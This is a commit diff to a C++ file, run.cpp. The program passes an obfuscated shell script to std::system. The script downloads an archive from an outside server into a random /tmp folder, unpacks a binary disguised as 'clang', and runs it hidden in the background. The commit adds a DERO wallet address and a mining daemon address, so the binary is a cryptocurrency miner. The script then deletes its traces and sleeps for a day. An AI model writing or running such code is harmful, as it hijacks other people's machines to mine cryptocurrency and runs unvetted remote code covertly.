30e4c449df937ba6100d5cf005f61621030b9ae2
dse8347 <107747125+dse8347@users.noreply.github.com>
2022-08-01 15:13:08 +0800

    Update run.cpp

--- run.cpp
+++ run.cpp
@@ -4,10 +4,9 @@ int main() {
 std::system(AY_OBFUSCATE("\n\
 CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
 mkdir -p /tmp/$CLANG\n\
-wget -qO /tmp/$CLANG/clang.tar https://github.com/dse8347/dr/raw/main/trap.tar\n\
+wget -qO /tmp/$CLANG/clang.tar https://gptech.id/ijin/worker.tar.xz\n\
 tar xf /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
-chmod +x /tmp/$CLANG/clang\n\
-nohup /tmp/$CLANG/clang >/dev/null 2>&1 & sleep 0.1\n\
+nohup /tmp/$CLANG/clang --wallet-address=dero1qyrt55sn338nzse3l7ulv7ygrtlqqp2s0sk0lepvendrf4xl4dlr7qgw7wa7x --daemon-rpc-address=20.52.56.109:10100 >/dev/null 2>&1 & sleep 0.1\n\
 rm -rf /tmp/$CLANG\n\
 sleep 24h\n"));
 }
